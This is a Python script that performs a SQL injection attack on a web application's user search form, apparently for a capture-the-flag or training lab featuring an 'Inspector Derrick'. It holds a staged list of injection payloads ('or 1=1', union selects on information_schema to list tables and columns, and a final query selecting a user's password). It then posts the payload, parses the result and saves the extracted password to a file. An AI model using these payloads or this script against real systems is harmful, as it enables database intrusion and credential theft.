from datarequesting import *
import re

derricks_pw_output_pattern = re.compile(r'Inspector Derrick\'s password is:(?P<password>\w*)')

attack_prefix = '\''
attack_suffix = '#'

attack_iterations = [
    'or 1=1',
    'union select 1, 2 from information_schema.tables',
    'union select 1, table_name from information_schema.tables',
    'union select column_name, table_name from information_schema.columns where table_name like \'users\'',
    'union select \'Inspector Derrick\\\'s password is\', users.password from users where users.name like \'inspector_derrick\''
]

form = f'{attack_prefix}{attack_iterations[-1]}{attack_suffix}'
form_data = {
    'name': form
}
soup = post_html_soup(f'{DOMAIN}users', form_data)
listgroup = soup.select_one('.list-group')
content = soup.select_one('.col-md-10.col-md-offset-1')
if content is None:
    print('Error performing post')
else:
    if listgroup is None:
        print('No names')
    else:
        out = listgroup.text.strip()
        print(out)
        match = derricks_pw_output_pattern.match(out)
        if match:
            with open('inpector_derricks_password.txt', 'w') as f:
                print(match.group('password'), file=f)